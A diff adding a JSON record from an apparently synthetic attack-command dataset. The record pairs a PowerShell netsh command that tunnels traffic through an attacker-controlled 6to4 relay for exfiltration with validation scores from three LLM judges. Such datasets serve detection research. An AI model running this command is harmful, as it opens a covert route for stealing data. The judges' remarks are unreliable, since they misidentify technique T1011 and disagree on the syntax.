@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface 6to4 set state enabled relay=198.51.100.42",
+  "explanation": "Enables 6to4 with a specified relay to route IPv6 traffic over IPv4 to a controlled endpoint, creating an alternative medium for exfiltration (T1011).",
+  "rationale_steps": [
+    "Activate 6to4 to encapsulate IPv6 traffic in IPv4.",
+    "Force traffic through a specific relay under attacker control.",
+    "Use the resulting IPv6 path for data exfiltration away from standard channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-bd44966f",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface 6to4 set state command, including proper parameter format and valid IP address specification.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does enable 6to4 tunneling which could potentially be used for exfiltration, this is more aligned with network configuration/tunneling (T1572) rather than the claimed T1011 (Modify System Image) as it doesn't modify firmware or OS images.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:12:07.160870Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct `netsh` syntax with valid contexts, subcommands, and parameter formats for Windows.",
+        "semantic_score": 1,
+        "semantic_justification": "The command modifies a network configuration setting within the running OS, which does not align with the T1011 technique of altering an OS/firmware image, and typically requires administrative privileges, contradicting the provided 'None' privilege claim.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:12:24.990332Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "netsh expects keyworded parameters (e.g., state=enabled), so 'enabled' without 'state=' is likely to cause a parse error even though the rest of the tokens and IP format are valid.",
+        "semantic_score": 2,
+        "semantic_justification": "While netsh 6to4 is conceptually suitable for creating an alternate exfiltration path, the command does not implement the described technique (Modify System Image) and also requires administrative privileges and a supported 6to4 environment contrary to the claim.",
+        "combined_score": 2.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T17:12:40.875027Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
